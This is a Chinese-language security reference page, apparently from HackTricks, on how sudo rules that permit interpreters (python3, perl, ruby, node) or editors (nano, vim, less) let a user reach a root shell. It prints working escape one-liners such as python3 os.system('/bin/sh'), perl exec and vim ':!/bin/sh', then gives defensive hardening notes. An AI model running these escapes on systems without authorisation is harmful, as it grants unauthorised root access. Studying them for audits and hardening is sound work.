# Sudo 命令滥用

## Sudo 允许的解释器

如果 `sudo -l` 允许用户以 root 身份运行解释器，应将其视为直接代码执行。解释器的设计目的就是执行任意代码，因此，允许运行 `python3`、`perl`、`ruby`、`lua`、`node` 或类似二进制文件的规则，通常等同于以 root 身份执行命令，除非其参数受到严格限制并经过验证。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

常见的审查流程是：首先列出用户的权限，然后使用解释器的 `-c` 选项执行一条 Python 语句。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
下面展示了其他解释器示例；所列解释器记录了 inline-code 执行或子进程 API。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
确切路径很重要。如果 sudo 规则允许使用 `/usr/bin/python3`，请在验证期间使用该确切路径。<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-允许的编辑器

如果 `sudo -l` 允许用户以 root 身份运行交互式编辑器，应将其视为命令执行入口，而不是无害的文件编辑权限。编辑器通常可以执行 shell 命令、读取任意文件、写入任意文件，或在编辑器内部调用外部辅助程序。<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

常见的审查流程：列出用户的权限，然后通过 sudo 调用每个允许使用的编辑器或分页器。<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano 命令执行

当允许通过 sudo 使用 `nano` 时，可以从编辑器界面执行命令。<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
然后在 nano 命令提示符中输入如 `id` 或 `/bin/sh` 这样的命令。<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
如果交互式 shell 没有可用的终端流，此重定向形式会将其标准输出和标准错误映射到文件描述符 0。<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
具体的按键序列可能会因 nano 版本和构建选项而有所不同，但安全问题是相同的：该编辑器以 root 身份运行，并且可以调用外部命令。<sup>[[1]](#references)[[12]](#references)</sup>

### 其他常见的编辑器逃逸

Vim-style editors 通常通过 `:!` 提供命令执行功能。<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
诸如 `less` 之类的 Pagers 也可能暴露 shell 执行功能。<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## 防御性说明

- 避免通过 sudo 授予 interpreters 或 interactive editors 权限。<sup>[[1]](#references)</sup>
- 优先使用由 root 拥有且固定的 wrappers，这些 wrappers 只执行一项范围狭窄的管理操作。<sup>[[1]](#references)[[2]](#references)</sup>
- 如果无法避免使用 interpreter，请限制确切的脚本路径，并阻止用户控制的参数、可写的 imports、`PYTHONPATH` 以及不安全的环境保留。<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- 如果需要编辑文件，请限制确切的文件路径，并考虑使用 `sudoedit`，同时确保 sudo 版本已修补且严格处理环境。<sup>[[1]](#references)[[2]](#references)</sup>
- 检查 `SETENV`、`env_keep`、可写的工作目录、可写的 module/import 路径、`NOEXEC`、`use_pty` 和 logging，但不要将它们视为完整的 sandbox。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [命令行和环境 — Python 文档](https://docs.python.org/3/using/cmdline.html)
- [4] [os — 杂项操作系统接口 — Python 文档](https://docs.python.org/3/library/os.html)
- [5] [perlrun — 如何执行 Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl 文档](https://perldoc.perl.org/functions/exec)
- [7] [Ruby 命令行选项](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby 文档](https://ruby-doc.org/3.4/Kernel.html)
- [9] [命令行 API — Node.js 文档](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js 文档](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua 手册页](https://www.lua.org/manual/5.4/lua.html)
- [12] [GNU nano 文本编辑器](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [重定向 — Bash 参考手册](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
